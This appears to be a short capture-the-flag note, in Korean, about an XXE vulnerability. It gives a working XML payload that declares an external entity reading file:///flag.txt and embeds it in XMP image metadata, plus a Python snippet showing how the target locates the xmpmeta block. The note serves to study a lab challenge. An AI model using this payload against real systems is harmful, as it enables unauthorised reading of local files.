```xml 
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Image::ExifTool 11.16">
        <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
                <rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/">
                        <dc:description>&xxe;</dc:description>
                </rdf:Description>
        </rdf:RDF>
</x:xmpmeta>
```

xxe 취약점 

근데 이제 xmpmeta 검사를 해서(아래코드참고) 이거 있는 payload 찾아야 함 

```python
start = image_bytes.find(b"<x:xmpmeta")
end = image_bytes.find(b"</x:xmpmeta>", start if start != -1 else 0)
```
